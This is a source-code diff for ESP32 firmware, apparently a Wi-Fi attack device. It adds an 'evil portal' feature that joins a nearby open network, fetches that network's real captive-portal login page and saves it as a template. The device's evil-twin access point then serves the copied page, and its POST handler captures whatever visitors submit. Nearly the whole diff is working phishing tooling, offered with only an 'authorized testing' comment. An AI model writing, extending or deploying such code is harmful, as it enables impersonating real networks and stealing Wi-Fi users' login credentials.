@@ -37,6 +37,8 @@
 #include "lwip/sockets.h"
 #include "lwip/inet.h"
 #include "esp_http_server.h"
+#include "esp_http_client.h"    // live captive-portal page cloning (join a real open AP, fetch its page)
+#include "nucleo_arb.h"         // heavy-work arbiter: ONE TLS/network job at a time (vs ANIMA online)
 #include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below
 
 // Restore the saved network on stop (resolved at link; nucleo_setup REQUIRES nucleo_app, so a
@@ -748,6 +750,101 @@ esp_err_t nucleo_evilportal_start_twin(const char *ssid, int template_idx, const
 {
     return start_impl(ssid, template_idx, channel, true, bssid, (wifi_auth_mode_t)authmode, coherent);
 }
+
+// ---- live captive-portal page cloning ---------------------------------------
+// Join a nearby OPEN network, hit its captive-portal probe, and STREAM the served login HTML to SD
+// as a new template (/sd/evilportal/portals/cloned.html). The portal's wildcard POST handler then
+// captures whatever that page submits, so NO HTML rewriting is needed. AUTHORIZED testing only.
+//
+// RAM discipline (the hard constraint on this no-PSRAM chip): do ONE heavy thing at a time.
+//   * take the heavy-work ARBITER token first -> serialized against ANIMA's online TLS (the mutex);
+//   * enter EXCLUSIVE mode -> free ~70KB (httpd/mDNS/voice/L1) before we touch the network stack;
+//   * STREAM the body through a 512 B stack buffer straight to SD -> the page is NEVER held in RAM;
+//   * CAP the size -> a runaway/huge response can't exhaust the card or spin forever;
+//   * a re-entrancy flag refuses a second concurrent clone.
+#define CLONE_FILE   PORTAL_TPL "/cloned.html"
+#define CLONE_MAXLEN (192 * 1024)            // a login page is small; refuse anything larger
+
+static volatile bool s_cloning;
+
+static esp_err_t clone_join_open(const char *ssid)   // associate + wait for an IP (≤ ~12 s)
+{
+    wifi_config_t sc = { 0 };
+    snprintf((char *)sc.sta.ssid, sizeof sc.sta.ssid, "%s", ssid);
+    sc.sta.threshold.authmode = WIFI_AUTH_OPEN;
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_set_config(WIFI_IF_STA, &sc);
+    esp_wifi_start();
+    esp_wifi_connect();
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    esp_netif_ip_info_t ip;
+    for (int i = 0; i < 120; i++) {                  // up to 12 s, yielding so the WDT is fed
+        if (sta && esp_netif_get_ip_info(sta, &ip) == ESP_OK && ip.ip.addr != 0) return ESP_OK;
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    return ESP_ERR_TIMEOUT;
+}
+
+// Returns bytes saved (>0) on success, or a negative error code (see header). Blocking ~≤20 s.
+int nucleo_evilportal_clone_page(const char *open_ssid)
+{
+    if (s_running)                   return -1;      // portal up -> the radio is busy serving
+    if (s_cloning)                   return -2;      // a clone is already in flight
+    if (!open_ssid || !open_ssid[0]) return -3;
+
+    uint32_t tok = nucleo_arb_acquire(ARB_FG, "ep-clone", 2000);
+    if (!tok) return -4;                             // another heavy job (ANIMA TLS) holds the token
+    s_cloning = true;
+
+    nucleo_setup_suspend();                          // no auto-reconnect to home mid-clone
+    nucleo_exclusive_enter(NX_NET_APP, NULL);        // free ~70KB; STA stays up (we need it to join)
+
+    int rc = 0;
+    if (clone_join_open(open_ssid) != ESP_OK) { rc = -10; goto done; }
+
+    mkdir(PORTAL_DIR, 0775); mkdir(PORTAL_TPL, 0775);
+    {
+        // generate_204: 204 = real internet (no captive portal here); 200/redirect = a portal that
+        // intercepts us. Auto-redirect on so a 302 is followed to the actual login page.
+        esp_http_client_config_t hc = { 0 };
+        hc.url            = "http://connectivitycheck.gstatic.com/generate_204";
+        hc.timeout_ms     = 8000;
+        hc.buffer_size    = 1024;
+        hc.buffer_size_tx = 512;
+        esp_http_client_handle_t cl = esp_http_client_init(&hc);
+        if (!cl) { rc = -11; goto done; }
+        if (esp_http_client_open(cl, 0) != ESP_OK) { esp_http_client_cleanup(cl); rc = -12; goto done; }
+        esp_http_client_fetch_headers(cl);
+        int status = esp_http_client_get_status_code(cl);
+        if (status == 204 || status == 0) {          // no captive portal -> nothing to clone
+            esp_http_client_close(cl); esp_http_client_cleanup(cl); rc = -13; goto done;
+        }
+        FILE *f = fopen(CLONE_FILE, "wb");
+        if (!f) { esp_http_client_close(cl); esp_http_client_cleanup(cl); rc = -14; goto done; }
+        char buf[512]; long total = 0; int n;
+        while ((n = esp_http_client_read(cl, buf, sizeof buf)) > 0) {
+            if (total + n > CLONE_MAXLEN) n = (int)(CLONE_MAXLEN - total);   // clamp the last chunk
+            if (n <= 0) break;
+            fwrite(buf, 1, n, f); total += n;
+            if (total >= CLONE_MAXLEN) break;        // hit the cap -> stop
+        }
+        fclose(f);
+        esp_http_client_close(cl); esp_http_client_cleanup(cl);
+        if (total < 32) { remove(CLONE_FILE); rc = -15; goto done; }    // too small to be a real page
+        rc = (int)total;                              // success
+    }
+
+done:
+    esp_wifi_disconnect();
+    nucleo_setup_apply_network();                    // restore the saved network (up first)
+    nucleo_exclusive_exit();                         // restart httpd + mDNS + voice; L1 reloads lazily
+    s_cloning = false;
+    nucleo_arb_release(tok);
+    return rc;
+}
+
+bool        nucleo_evilportal_cloning(void)    { return s_cloning; }
+const char *nucleo_evilportal_clone_name(void) { return "cloned"; }   // template name after a clone
 
 void nucleo_evilportal_stop(void)
 {
